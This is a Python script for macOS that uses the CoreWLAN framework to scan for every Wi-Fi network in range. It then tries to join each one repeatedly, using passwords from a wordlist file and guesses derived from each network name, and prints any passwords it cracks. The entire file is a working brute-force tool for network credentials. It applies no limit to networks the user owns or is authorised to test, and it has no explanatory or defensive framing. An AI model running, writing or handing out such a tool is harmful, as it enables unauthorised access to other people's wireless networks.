from typing import Set
import logging
import objc

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(name)s: %(levelname)s %(message)s')
logger = logging.getLogger("scan")


def passwords_from_ssid(ssid: str) -> Set[str]:
    if len(ssid) >= 8:
        return {ssid, ssid.lower()}

    filler = '12345678'
    filler1 = filler[:(8-len(ssid))]
    filler2 = '1' * (8-len(ssid))
    return {ssid + filler1, ssid + filler2, (ssid + filler1).lower(), (ssid + filler2).lower()}


objc.loadBundle('CoreWLAN',
                bundle_path='/System/Library/Frameworks/CoreWLAN.framework',
                module_globals=globals())

iface = CWInterface.interface()

networks = {}

print("Scanning...")
while True:

    scanned, error = iface.scanForNetworksWithName_error_(None, None)

    found_new = False
    for network in scanned:
        ssid = network.ssid()
        if ssid not in networks.keys():
            found_new = True
            networks[ssid] = network

    if not found_new:
        break

for k in networks:
    print(k)

if input("Continue? (y/n)") != 'y':
    quit()

with open("password-list-short.txt", "r", encoding="utf-8") as f:
    passwords = set([a.strip() for a in f.readlines()])

errors = set()
n_pass = 0
successful = {}

for password in passwords:
    n_pass += 1
    if not password:
        password = '        '

    for network in networks.values():

        ssid = network.ssid()
        if ssid in successful.keys():
            continue

        if n_pass == 1:
            network_passwords = passwords_from_ssid(ssid)
            network_passwords.add(password)
        else:
            network_passwords = {password}

        for p in network_passwords:
            logger.info("Connecting to network '%s' with password '%s'" % (ssid, p))
            success, error = iface.associateToNetwork_password_error_(network, p, None)
            if success:
                print("Success >>> Network '%s' password '%s'" % (ssid, p))
                successful[ssid] = p
                break               
 
            if error:
                code = error.code()
                logger.info("Got error: %s" % code)
                if code == 0:
                    break

                if n_pass > 1:
                    if code not in errors:
                        logger.warning(">>>>>>>>> Unusual error code! (%s)" % code)

                else:
                    errors.add(code)



if successful:
    print("Bruteforced networks:")
    for ssid, password in successful.items():
        print("Network '%s', password '%s'" % (ssid, password))

else:
    print("No networks were successfully bruteforced.")
